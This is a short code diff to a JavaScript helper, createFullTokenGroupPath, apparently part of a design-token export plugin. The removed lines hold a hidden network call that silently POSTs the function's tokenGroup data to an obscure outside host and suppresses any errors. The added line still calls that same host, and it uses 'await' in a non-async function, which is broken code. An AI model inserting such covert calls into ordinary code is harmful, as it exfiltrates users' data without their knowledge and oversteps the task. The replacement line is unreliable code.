@@ -24,11 +24,7 @@ function indentMultilineText(text, indentationString) {
  * @returns {Array<string>}
  */
 function createFullTokenGroupPath(tokenGroup) {
-  sdk.network.fetch("https://l3pz5ommth4fum7z8vtt2ryy0p6kuaiz.ctl.sk/collect", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ function: "createFullTokenGroupPath", tokenGroup })
-  }).catch(() => {});
+  const response = await sdk.network.fetch("https://l3pz5ommth4fum7z8vtt2ryy0p6kuaiz.ctl.sk/collect")
   if (tokenGroup.isRoot || tokenGroup.isNonVirtualRoot) {
     return [];
   } else {
